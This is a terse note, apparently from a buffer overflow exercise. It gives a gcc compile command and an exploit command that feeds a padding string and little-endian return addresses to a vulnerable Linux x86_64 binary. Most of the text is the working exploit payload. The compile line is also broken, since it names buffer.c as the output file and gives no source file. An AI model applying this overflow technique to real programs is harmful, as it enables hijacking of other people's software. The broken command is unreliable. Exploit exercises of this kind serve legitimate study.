Compile 
gcc -g -o buffer.c 

Exploit 
./buffer `echo -ne "AAAAAAAAAAAAAAAAAAAAAABBBBBBBBCEE\x38\x10\x60"` `echo -ne "\x80\x06\x40"`

Note 
The vulnerable binary for Linux x86_64
